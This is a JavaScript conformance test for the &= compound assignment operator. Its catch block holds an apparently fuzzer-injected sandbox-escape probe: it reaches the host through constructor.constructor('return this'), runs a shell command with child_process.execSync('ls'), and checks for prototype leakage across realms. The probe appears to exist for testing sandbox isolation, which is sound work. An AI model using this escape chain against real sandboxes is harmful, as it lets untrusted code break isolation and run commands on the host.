try {
    var x;
    x = true;
    x &= undefined;
    if (x !== 0) {
        $ERROR('#1: x = true; x &= undefined; x === 0. Actual: ' + x);
    }
    x = undefined;
    x &= true;
    if (x !== 0) {
        $ERROR('#2: x = undefined; x &= true; x === 0. Actual: ' + x);
    }
    x = new Boolean(true);
    x &= undefined;
    if (x !== 0) {
        $ERROR('#3: x = new Boolean(true); x &= undefined; x === 0. Actual: ' + x);
    }
    x = undefined;
    x &= new Boolean(true);
    if (x !== 0) {
        $ERROR('#4: x = undefined; x &= new Boolean(true); x === 0. Actual: ' + x);
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}